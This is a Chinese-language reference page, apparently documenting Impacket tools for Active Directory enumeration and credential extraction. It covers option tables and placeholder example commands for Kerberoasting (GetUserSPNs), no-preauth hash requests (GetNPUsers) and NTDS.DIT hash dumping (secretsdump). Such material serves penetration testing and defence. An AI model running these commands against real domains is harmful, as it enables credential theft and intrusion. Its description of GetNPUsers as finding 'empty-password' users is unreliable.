+<h2 id="域信息收集工具"><a href="#域信息收集工具" class="headerlink" title="域信息收集工具"></a>域信息收集工具</h2><h3 id="GetADUsers-py"><a href="#GetADUsers-py" class="headerlink" title="GetADUsers.py"></a>GetADUsers.py</h3><p><strong>功能</strong>: 获取域用户详细信息<br><strong>用途</strong>: 枚举域内所有用户账户及其属性</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>domain[&#x2F;username[:password]]</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-user username</code></td>
+<td>请求特定用户的数据</td>
+</tr>
+<tr>
+<td><code>-all</code></td>
+<td>返回所有用户，包括没有电子邮件地址和已禁用的账户。与 -user 一起使用时，即使账户已禁用也会返回用户信息</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-dc-host hostname</code></td>
+<td>要使用的域控制器主机名</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetADUsers.py domain/username:password@dc_ip</span><br><span class="line">python GetADUsers.py -<span class="built_in">all</span> domain/username:password@dc_ip</span><br><span class="line">python GetADUsers.py -user administrator domain/username:password@dc_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="GetADComputers-py"><a href="#GetADComputers-py" class="headerlink" title="GetADComputers.py"></a>GetADComputers.py</h3><p><strong>功能</strong>: 获取域内所有计算机信息<br><strong>用途</strong>: 枚举域内所有计算机及其属性</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>domain[&#x2F;username[:password]]</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-user username</code></td>
+<td>请求特定用户的数据</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-resolveIP</code></td>
+<td>尝试解析计算机对象的 IP 地址，通过在 DC 上执行 nslookup</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-dc-host hostname</code></td>
+<td>要使用的域控制器主机名</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python GetADComputers.py domain/username:password@dc_ip</span><br><span class="line">python GetADComputers.py -resolveIP domain/username:password@dc_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="GetUserSPNs-py"><a href="#GetUserSPNs-py" class="headerlink" title="GetUserSPNs.py"></a>GetUserSPNs.py</h3><p><strong>功能</strong>: 获取用户服务主体名称<br><strong>用途</strong>: 查找域内配置了 SPN 的用户账户，可用于 Kerberoasting 攻击</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>domain[&#x2F;username[:password]]</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-target-domain TARGET_DOMAIN</code></td>
+<td>要查询&#x2F;请求的域（如果与用户域不同），允许跨信任域进行 Kerberoasting</td>
+</tr>
+<tr>
+<td><code>-no-preauth NO_PREAUTH</code></td>
+<td>不需要预认证的账户，通过 AS 获取服务票据</td>
+</tr>
+<tr>
+<td><code>-stealth</code></td>
+<td>从 LDAP 查询中移除 (servicePrincipalName&#x3D;*) 过滤器以增加隐蔽性，可能导致大域内存消耗&#x2F;错误</td>
+</tr>
+<tr>
+<td><code>-machine-only</code></td>
+<td>仅查询计算机账户，将 objectCategory&#x3D;person 改为 objectCategory&#x3D;computer</td>
+</tr>
+<tr>
+<td><code>-usersfile USERSFILE</code></td>
+<td>每行一个用户的测试文件</td>
+</tr>
+<tr>
+<td><code>-request</code></td>
+<td>请求用户的 TGS 并以 JtR&#x2F;hashcat 格式输出</td>
+</tr>
+<tr>
+<td><code>-request-user username</code></td>
+<td>请求与指定用户关联的 SPN 的 TGS（仅用户名，无需域）</td>
+</tr>
+<tr>
+<td><code>-request-machine machinename</code></td>
+<td>请求与指定计算机关联的 SPN 的 TGS，例如 <code>workstation01$</code></td>
+</tr>
+<tr>
+<td><code>-save</code></td>
+<td>将请求的 TGS 保存到磁盘，格式为 <username>.ccache，自动选择 -request</td>
+</tr>
+<tr>
+<td><code>-outputfile OUTPUTFILE</code></td>
+<td>以 JtR&#x2F;hashcat 格式输出密码的文件名，自动选择 -request</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-dc-host hostname</code></td>
+<td>要使用的域控制器主机名</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py domain/username:password@dc_ip</span><br><span class="line">python GetUserSPNs.py -request domain/username:password@dc_ip</span><br><span class="line">python GetUserSPNs.py -request-user administrator domain/username:password@dc_ip</span><br><span class="line">python GetUserSPNs.py -target-domain target.local domain/username:password@dc_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="GetNPUsers-py"><a href="#GetNPUsers-py" class="headerlink" title="GetNPUsers.py"></a>GetNPUsers.py</h3><p><strong>功能</strong>: 获取空密码用户账户<br><strong>用途</strong>: 查找域内配置为空密码或可被匿名访问的用户</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>[[domain&#x2F;]username[:password]]</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-request</code></td>
+<td>请求用户的 TGT 并以 JtR&#x2F;hashcat 格式输出</td>
+</tr>
+<tr>
+<td><code>-outputfile OUTPUTFILE</code></td>
+<td>以 JtR&#x2F;hashcat 格式输出密码的文件名</td>
+</tr>
+<tr>
+<td><code>-format {hashcat,john}</code></td>
+<td>保存无预认证用户 AS_REQ 的格式，默认为 hashcat</td>
+</tr>
+<tr>
+<td><code>-usersfile USERSFILE</code></td>
+<td>每行一个用户的测试文件</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-dc-host hostname</code></td>
+<td>要使用的域控制器主机名</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py domain/ -request</span><br><span class="line">python GetNPUsers.py -usersfile users.txt domain/ -request</span><br><span class="line">python GetNPUsers.py -<span class="built_in">format</span> john domain/ -request</span><br></pre></td></tr></table></figure>
+
+<h3 id="lookupsid-py"><a href="#lookupsid-py" class="headerlink" title="lookupsid.py"></a>lookupsid.py</h3><p><strong>功能</strong>: SID 查询和转换工具<br><strong>用途</strong>: 将 SID 转换为用户名或组名</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>maxRid</code></td>
+<td>要检查的最大 Rid（默认 4000）</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+<tr>
+<td><code>-domain-sids</code></td>
+<td>枚举域 SID（可能会将请求转发到 DC）</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（通过 smbrelayx 代理时有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py domain/username:password@target_ip</span><br><span class="line">python lookupsid.py -domain-sids domain/username:password@target_ip</span><br><span class="line">python lookupsid.py target_ip <span class="number">1000</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="findDelegation-py"><a href="#findDelegation-py" class="headerlink" title="findDelegation.py"></a>findDelegation.py</h3><p><strong>功能</strong>: 查找域内委派配置<br><strong>用途</strong>: 检测域内的委派设置，用于权限提升<br><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python findDelegation.py domain/username:password@dc_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="machine-role-py"><a href="#machine-role-py" class="headerlink" title="machine_role.py"></a>machine_role.py</h3><p><strong>功能</strong>: 查询机器角色（域控制器&#x2F;成员服务器）<br><strong>用途</strong>: 检索主机的角色及其主要域详细信息</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python machine_role.py target_ip</span><br><span class="line">python machine_role.py domain/username:password@target_ip</span><br><span class="line">python machine_role.py -target-ip <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span> domain/username:password@target_name</span><br></pre></td></tr></table></figure>
+
+<h3 id="netview-py"><a href="#netview-py" class="headerlink" title="netview.py"></a>netview.py</h3><p><strong>功能</strong>: 网络视图信息收集<br><strong>用途</strong>: 获取网络共享和会话信息<br><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python netview.py domain/username:password@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="net-py"><a href="#net-py" class="headerlink" title="net.py"></a>net.py</h3><p><strong>功能</strong>: 网络管理信息收集<br><strong>用途</strong>: SAMR RPC 客户端实现</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>{user,computer,localgroup,group}</code></td>
+<td>账户条目名称</td>
+</tr>
+<tr>
+<td>user</td>
+<td><code>user</code>: 枚举所有域&#x2F;本地用户账户</td>
+</tr>
+<tr>
+<td>computer</td>
+<td><code>computer</code>: 枚举域级别中的所有计算机</td>
+</tr>
+<tr>
+<td>localgroup</td>
+<td><code>localgroup</code>: 枚举本地计算机的本地组（别名）</td>
+</tr>
+<tr>
+<td>group</td>
+<td><code>group</code>: 枚举在域控制器中注册的域组</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python net.py user domain/username:password@target_ip</span><br><span class="line">python net.py computer domain/username:password@target_ip</span><br><span class="line">python net.py localgroup domain/username:password@target_ip</span><br><span class="line">python net.py group domain/username:password@target_ip</span><br></pre></td></tr></table></figure>
+
+<h2 id="凭证提取工具"><a href="#凭证提取工具" class="headerlink" title="凭证提取工具"></a>凭证提取工具</h2><h3 id="secretsdump-py"><a href="#secretsdump-py" class="headerlink" title="secretsdump.py"></a>secretsdump.py</h3><p><strong>功能</strong>: 转储域哈希和密码哈希<br><strong>用途</strong>: 从域控制器或本地系统提取密码哈希，无需在目标系统上执行任何代理</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code> 或 LOCAL（如果要解析本地文件）</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-system SYSTEM</code></td>
+<td>要解析的 SYSTEM hive（仅二进制 REGF，.reg 文本文件缺少计算 bootkey 的元数据）</td>
+</tr>
+<tr>
+<td><code>-bootkey BOOTKEY</code></td>
+<td>SYSTEM hive 的 bootkey</td>
+</tr>
+<tr>
+<td><code>-security SECURITY</code></td>
+<td>要解析的 SECURITY hive</td>
+</tr>
+<tr>
+<td><code>-sam SAM</code></td>
+<td>要解析的 SAM hive</td>
+</tr>
+<tr>
+<td><code>-ntds NTDS</code></td>
+<td>要解析的 NTDS.DIT 文件</td>
+</tr>
+<tr>
+<td><code>-resumefile RESUMEFILE</code></td>
+<td>恢复文件名称，用于恢复 NTDS.DIT 会话转储</td>
+</tr>
+<tr>
+<td><code>-skip-sam</code></td>
+<td>不解析远程系统上的 SAM hive</td>
+</tr>
+<tr>
+<td><code>-skip-security</code></td>
+<td>不解析远程系统上的 SECURITY hive</td>
+</tr>
+<tr>
+<td><code>-outputfile OUTPUTFILE</code></td>
+<td>基本输出文件名，将为 sam、secrets、cached 和 ntds 添加扩展名</td>
+</tr>
+<tr>
+<td><code>-use-vss</code></td>
+<td>使用 NTDSUTIL VSS 方法代替默认的 DRSUAPI</td>
+</tr>
+<tr>
+<td><code>-rodcNo RODCNO</code></td>
+<td>RODC krbtgt 账户的编号（仅适用于 Kerb-Key-List 方法）</td>
+</tr>
+<tr>
+<td><code>-rodcKey RODCKEY</code></td>
+<td>只读域控制器的 AES 密钥（仅适用于 Kerb-Key-List 方法）</td>
+</tr>
+<tr>
+<td><code>-use-keylist</code></td>
+<td>使用 Kerb-Key-List 方法代替默认的 DRSUAPI</td>
+</tr>
+<tr>
+<td><code>-exec-method [{smbexec,wmiexec,mmcexec}]</code></td>
+<td>在目标上使用的远程执行方法（仅在使用 -use-vss 时）</td>
+</tr>
+<tr>
+<td><code>-use-remoteSSWMI</code></td>
+<td>通过 WMI 远程创建影子快照并下载 SAM、SYSTEM 和 SECURITY</td>
+</tr>
+<tr>
+<td><code>-use-remoteSSWMI-NTDS</code></td>
+<td>使用远程影子快照方法时也转储 NTDS.DIT</td>
+</tr>
+<tr>
+<td><code>-remoteSSWMI-remote-volume REMOTESSWMI_REMOTE_VOLUME</code></td>
+<td>执行影子快照并下载文件的远程卷（默认为 C:\）</td>
+</tr>
+<tr>
+<td><code>-remoteSSWMI-local-path REMOTESSWMI_LOCAL_PATH</code></td>
+<td>从影子快照下载文件的本地路径（默认为当前路径）</td>
+</tr>
+</tbody></table>
+<p><strong>显示选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-just-dc-user USERNAME</code></td>
+<td>仅提取指定用户的 NTDS.DIT 数据</td>
+</tr>
+<tr>
+<td><code>-ldapfilter LDAPFILTER</code></td>
+<td>根据 LDAP 过滤器提取特定用户的 NTDS.DIT 数据</td>
+</tr>
+<tr>
+<td><code>-just-dc</code></td>
+<td>仅提取 NTDS.DIT 数据（NTLM 哈希和 Kerberos 密钥）</td>
+</tr>
+<tr>
+<td><code>-just-dc-ntlm</code></td>
+<td>仅提取 NTDS.DIT 数据（仅 NTLM 哈希）</td>
+</tr>
+<tr>
+<td><code>-skip-user SKIP_USER</code></td>
+<td>不提取指定用户的 NTDS.DIT 数据</td>
+</tr>
+<tr>
+<td><code>-pwd-last-set</code></td>
+<td>显示每个 NTDS.DIT 账户的 pwdLastSet 属性</td>
+</tr>
+<tr>
+<td><code>-user-status</code></td>
+<td>显示用户是否被禁用</td>
+</tr>
+<tr>
+<td><code>-history</code></td>
+<td>转储密码历史记录和 LSA secrets OldVal</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-keytab KEYTAB</code></td>
+<td>从 keytab 文件读取 SPN 的密钥</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py domain/username:password@dc_ip</span><br><span class="line">python secretsdump.py -just-dc domain/username:password@dc_ip</span><br><span class="line">python secretsdump.py -just-dc-user <span class="string">&quot;administrator&quot;</span> domain/username:password@dc_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="samrdump-py"><a href="#samrdump-py" class="headerlink" title="samrdump.py"></a>samrdump.py</h3><p><strong>功能</strong>: 转储 SAM 数据库内容<br><strong>用途</strong>: 从远程系统获取 SAM 数据库信息，下载目标系统的用户列表</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-csv</code></td>
+<td>启用 CSV 输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
